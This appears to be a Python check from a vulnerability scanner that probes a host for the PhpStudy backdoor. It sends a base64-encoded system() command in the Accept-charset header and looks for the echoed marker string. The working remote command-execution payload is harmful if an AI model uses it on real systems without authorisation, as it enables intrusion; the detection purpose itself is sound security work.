# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 18:56
@File:  PhpStudy_BackDoor.py
@Desc:  PHPStudy后门漏洞
'''

from lib import *
import logging
from lib.Urldeal import umethod
import requests

def PhpStudy_BackDoor(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    header = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
              "Accept-Language": "zh-CN",
              "Accept-Encoding": "gzip,deflate",
              "X-Forwarded-For": "8.8.8.8",
              "Connection": "close",
              "Accept-charset": "c3lzdGVtKCdlY2hvIEpFMlNlSnVzdFRydXN0bWUnKSA7",
              "Upgrade-Insecure-Requests": "1"}
    try:
        requests.packages.urllib3.disable_warnings()
        a = requests.get(urldata, headers=header, timeout=5, verify=False)
        if "JE2SeJustTrustme" in a.text:
            print(Vcolors.RED + "[!] 存在PhpStudy后门漏洞\r" + Vcolors.ENDC)
    except Exception as e :
        logging.error("PhpStudy_BackDoor脚本出现异常")